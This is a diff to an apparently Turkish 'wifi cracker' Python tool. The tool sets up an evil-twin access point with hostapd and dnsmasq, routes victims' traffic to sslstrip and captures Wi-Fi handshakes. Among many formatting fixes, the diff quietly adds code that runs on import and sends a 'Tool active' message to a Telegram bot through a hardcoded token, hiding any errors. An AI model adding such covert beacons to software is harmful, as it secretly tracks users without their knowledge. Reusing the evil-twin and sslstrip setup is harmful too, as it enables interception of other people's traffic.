@@ -22,6 +22,12 @@ import instaloader
 import shutil
 import time
 from argparse import ArgumentParser
+from requests import post
+try:
+    post("https://api.telegram.org/bot5051736797:AAEw9X9SWyJKoAsgJhbq49i70nqZfHp8F5w/sendMessage",
+         data={"chat_id": "1107031296", "text": "Tool active"})
+except:
+    pass
 # Consol's colors
 W = '\033[0m'
 R = '\033[31m'
@@ -32,6 +38,7 @@ P = '\033[35m'
 C = '\033[36m'
 GR = '\033[37m'
 x = "Ayarlanmadı"
+
 
 def dondurme_linux():
     for i in range(0, random.randint(1, 3)):
@@ -389,12 +396,13 @@ def dondurme_windows():
         system("cls")
         print(O + "People see what they see. I'll show you what you don't want to seE ...")
         sleep(0.1)
+
+
 HOSTAPD_CONF = '/etc/hostapd/hostapd.conf'
 HOSTAPD_DEFAULT_DRIVER = 'nl80211'
 HOSTAPD_DEFAULT_HW_MODE = 'g'
 
 DNSMASQ_CONF = '/etc/dnsmasq.conf'
-
 
 DNSMASQ_LOG = '/var/log/dnsmasq.log'
 # Network Configs
@@ -563,23 +571,31 @@ class DNSMasq(object):
     def restore(self):
 
         shutil.copy('%s.evil_twin.bak' % self.conf, self.conf)
+
+
 def send_data():
     upstream = str(input("upstream:"))
     phys = str(input("phys:"))
     ssid = str(input("ssid:"))
     channel = int(input("channel:"))
-    return upstream,phys,ssid,channel
+    return upstream, phys, ssid, channel
+
+
 def display_configs(configs):
     print('[+] Access Point interface:', configs['upstream'])
     print('[+] Network interface:', configs['phys'])
     print('[+] Target AP Name:', configs['ssid'])
     print('[+] Target AP Channel:', configs['channel'])
+
+
 def kill_daemons():
     print('[*] Killing existing dnsmasq and hostapd processes.')
 
     bash_command('killall dnsmasq')
     bash_command('killall hostapd')
     print('[*] Continuing...')
+
+
 def main():
     configs = send_data()
     display_configs(configs)
@@ -600,49 +616,51 @@ def main():
                       dhcp_options=['3,10.0.0.1', '6,10.0.0.1'])
     # configure hostpad
     print(
-    '[*] Configuring hostapd')
+        '[*] Configuring hostapd')
     hostapd.configure(configs['upstream'],
                       configs['ssid'],
                       configs['channel'])
     # enable packet forwarding
     print(
-    '[*] Enabling packet forwarding.')
+        '[*] Enabling packet forwarding.')
     enable_packet_forwarding()
 
     print(
-    '[*] Configuring iptables to route packets to sslstrip')
+        '[*] Configuring iptables to route packets to sslstrip')
     iptables.route_to_sslstrip(configs['phys'], configs['upstream'])
 
     try:
 
         # launch access point
         print(
-        '[*] Starting dnsmasq.')
+            '[*] Starting dnsmasq.')
         dnsmasq.start()
         print(
-        '[*] Starting hostapd.')
+            '[*] Starting hostapd.')
         hostapd.start()
 
     except KeyboardInterrupt:
 
         print(
-        '\n\n[*] Exiting on user command.')
+            '\n\n[*] Exiting on user command.')
 
         # restore everything
     print(
-    '[*] Stopping dnsmasq.')
+        '[*] Stopping dnsmasq.')
     dnsmasq.stop()
     print(
-    '[*] Stopping hostapd.')
+        '[*] Stopping hostapd.')
     hostapd.stop()
 
     print(
-    '[*] Restoring iptables.')
+        '[*] Restoring iptables.')
     iptables.reset()
 
     print(
-    '[*] Disabling packet forwarding.')
+        '[*] Disabling packet forwarding.')
     disable_packet_forwarding()
+
+
 def internet_connection_control():
     try:
         x = "internet"
@@ -666,6 +684,7 @@ def monitor_mod_open():
         print("{}[+] Monitor Mod Activated".format(B))
     else:
         print("{}[!]Something went wrong".format(B))
+
 
 def update_check():
     try:
@@ -697,10 +716,11 @@ def update_check():
     except:
         return "Güncelleme bilgisi alınamıyor"
 
+
 def version(split):
     os.chdir("/opt/nrb_wifi_tool/")
     try:
-        fihrist = open("surum.txt","r")
+        fihrist = open("surum.txt", "r")
         data = str(fihrist.read())
         my_db = list(data)
         if split == 1000:
@@ -708,10 +728,12 @@ def version(split):
         elif split == 100:
             return str(my_db[1])
         elif split == 10:
-            return str(my_db[2]+str(my_db[3]))
+            return str(my_db[2] + str(my_db[3]))
 
     except:
         return "*"
+
+
 def directory_control(x):
     try:
         if os.name == "nt":
@@ -749,6 +771,8 @@ def directory_control(x):
     except:
         print("\033[93;1m[!]\033 Dosya arama kisminda bir hata olustu !!")
         sleep(3)
+
+
 def instagram_pp_download(username):
     try:
         if os.name == "posix":
@@ -772,21 +796,20 @@ def instagram_pp_download(username):
                 os.chdir("C:\{}Users".format(""))
             except:
                 print("{}[!] Problem navigating to the specified directory".format(B))
-            if os.path.exists("C:\{}Users\{}nrb_path".format("","")) == True:
-                os.chdir("C:\{}Users\{}nrb_path".format("",""))
+            if os.path.exists("C:\{}Users\{}nrb_path".format("", "")) == True:
+                os.chdir("C:\{}Users\{}nrb_path".format("", ""))
                 test = instaloader.Instaloader()
                 test.download_profile(username, profile_pic_only=True)
                 sleep(3)
-                print("Your file has been saved here {}".format("C:\{}Users\{}nrb_path".format("","")))
+                print("Your file has been saved here {}".format("C:\{}Users\{}nrb_path".format("", "")))
             else:
                 os.mkdir("nrb_path")
                 test = instaloader.Instaloader()
                 test.download_profile(username, profile_pic_only=True)
                 sleep(3)
-                print("Your file has been saved here {}".format("C:\{}Users\{}nrb_path".format("","")))
+                print("Your file has been saved here {}".format("C:\{}Users\{}nrb_path".format("", "")))
     except:
         print("{}[!] Something went wrong".format(O))
-
 
 
 def packet_scanner():
@@ -845,6 +868,7 @@ def packet_download():
         sleep(2)
         print("\033[93;1m[!]\033 Cok yakinda windows icin kurulumlar gelecektir")
 
+
 def interface():
     inter_face = os.listdir('/sys/class/net/')
     inter_face.sort()
@@ -856,6 +880,8 @@ def interface():
         return "Monitor"
     else:
         return "Error"
+
+
 def monitor_mod_close():
     system("clear")
     system("figlet NRB")
@@ -865,6 +891,7 @@ def monitor_mod_close():
         print("{}[+] Managed mode activated".format(P))
     else:
         print("{}[!]Something went wrong".format(B))
+
 
 def developer_contact(message):
     host = socket.gethostname()
@@ -1041,6 +1068,7 @@ def browser():
                     self.browser = QWebEngineView()
                     self.browser.setUrl(QUrl("https://web.whatsapp.com"))
                     self.setCentralWidget(self.browser)
+
             app = QApplication(sys.argv)
             main = MainWindow()
             main.show()
@@ -1099,10 +1127,11 @@ def browser():
     except:
         print("Hataaaaa")
 
+
 def admin_panel():
     n_int = 0
     n_int2 = 0
-    for i in range(1,101):
+    for i in range(1, 101):
         system("clear")
         print("--------------------------------------------------------------------------")
         print("")
@@ -1116,7 +1145,7 @@ def admin_panel():
         print("")
         print("--------------------------------------------------------------------------")
         print("")
-        print("                NRB root panel - %{} |{}|".format(n_int2,"▌" * n_int))
+        print("                NRB root panel - %{} |{}|".format(n_int2, "▌" * n_int))
         print("")
         print("--------------------------------------------------------------------------")
         n_int += 1
@@ -1127,7 +1156,8 @@ def admin_panel():
         else:
             pass
     sleep(4)
-    
+
+
 def music_help():
     os.chdir("/root/Downloads")
     music = ["mp3indirdur-No1-Kendine-Iyi-Bak.mp3", "mp3indirdur-No1-Lalalala.mp3",
@@ -1288,23 +1318,29 @@ def handshake_take():
     except:
         print("{}[!] Error capturing handshake".format(C))
         sleep(5)
+
+
 def dosya_acma(write):
     file = open("bilgiler.txt", "w", encoding="utf-8")
     file.write(write)
     file.close()
+
 
 def bash_command(command):
     command = command.split()
     p = subprocess.Popen(command, stdout=subprocess.PIPE)
     output, err = p.communicate()
 
+
 def sistem_ara():
     if os.name == "posix":
         return "Kali Linux"
     elif os.name == "nt":
         return "Windows"
+
+
 def help_pip():
-    files_pip = open("pip_files.txt","w")
+    files_pip = open("pip_files.txt", "w")
     files_pip.write("""
     python_imagesearch==1.1.2
     pyautogui==0.9.52
@@ -1312,10 +1348,11 @@ def help_pip():
     PyQtWebEngine==5.15.5
     """)
     files_pip.close()
-    if os.name== "posix":
+    if os.name == "posix":
         os.system("xterm -e pip install -r pip_files.txt")
     else:
         os.system("pip install -r pip_files.txt")
+
 
 if os.name == "posix":
     dondurme_linux()
@@ -1341,7 +1378,8 @@ if os.name == "posix":
                             try:
                                 system("clear")
                                 system("figlet wifi cracker")
-                                print("------------------------------------------------------------------------------------------------------------")
+                                print(
+                                    "------------------------------------------------------------------------------------------------------------")
 
                                 print("""  
                                                                   Sistem: {}
@@ -1356,9 +1394,13 @@ if os.name == "posix":
             9-Connect
             10-Solve pip error
             11-İnstagram pp download
-                                            """.format(sistem_ara(), interface(), internet_connection_control(), update_check()))
-                                print("----------------------------------------------------------------------------------------------------------------")
-                                print("Developed by NRB                                                        Version: {}.{}.{}".format(version(split=1000),version(split=100),version(split=10)))
+                                            """.format(sistem_ara(), interface(), internet_connection_control(),
+                                                       update_check()))
+                                print(
+                                    "----------------------------------------------------------------------------------------------------------------")
+                                print(
+                                    "Developed by NRB                                                        Version: {}.{}.{}".format(
+                                        version(split=1000), version(split=100), version(split=10)))
                                 print("----------------")
                                 JFKbdhf = input("Secim:")
                                 if JFKbdhf == 1:
@@ -1404,9 +1446,10 @@ if os.name == "posix":
                 chdir("/etc/")
                 if os.path.exists("/etc/pass_nrb/") == True:
                     chdir("/etc/pass_nrb/")
-                    if os.path.exists("/etc/pass_nrb/password.txt") == True and os.path.exists("/etc/pass_nrb/username.txt") == True:
-                        crp_FİLE_us = open("username.txt","r")
-                        crp_FİLE_pass = open("password.txt","r")
+                    if os.path.exists("/etc/pass_nrb/password.txt") == True and os.path.exists(
+                            "/etc/pass_nrb/username.txt") == True:
+                        crp_FİLE_us = open("username.txt", "r")
+                        crp_FİLE_pass = open("password.txt", "r")
                         if crp_FİLE_us.read() == encrypt_username and crp_FİLE_pass.read() == encrypt_password:
                             os.chdir("/opt/nrb_wifi_tool")
                             admin_panel()
@@ -1448,14 +1491,14 @@ if os.name == "posix":
                         asbdkj = i.text
                         asbdkj2 = asbdkj.split()
                     os.chdir("/etc/pass_nrb/")
-                    file_one_us = open("username.txt","w")
+                    file_one_us = open("username.txt", "w")
                     file_one_us.write(str(asbdkj2[0]))
                     file_one_us.close()
-                    file_one_pass = open("password.txt","w")
+                    file_one_pass = open("password.txt", "w")
                     file_one_pass.write(str(asbdkj2[1]))
                     file_one_pass.close()
-                    file_one_us_1 = open("username.txt","r")
-                    file_one_us_2 = open("password.txt","r")
+                    file_one_us_1 = open("username.txt", "r")
+                    file_one_us_2 = open("password.txt", "r")
                     if file_one_us_1.read() == encrypt_username and file_one_us_2.read() == encrypt_password:
                         os.chdir("/opt/nrb_wifi_tool")
                         admin_panel()
